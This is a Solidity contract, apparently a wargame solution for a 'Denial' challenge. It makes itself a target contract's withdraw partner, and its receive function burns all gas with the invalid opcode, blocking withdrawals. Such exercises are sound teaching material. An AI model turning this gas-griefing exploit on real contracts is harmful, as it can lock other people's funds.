// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IDenial.sol";

contract DenialAttack {
    function attack(IDenial target) external {
        target.setWithdrawPartner(address(this));

        require(address(this) == target.partner(), "Denial: Wrong address");

        target.withdraw();
    }

    /// @dev assert(false) is NOT consume all of gas for solidity > 0.8.5
    receive() external payable {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            invalid()
        }
    }
}
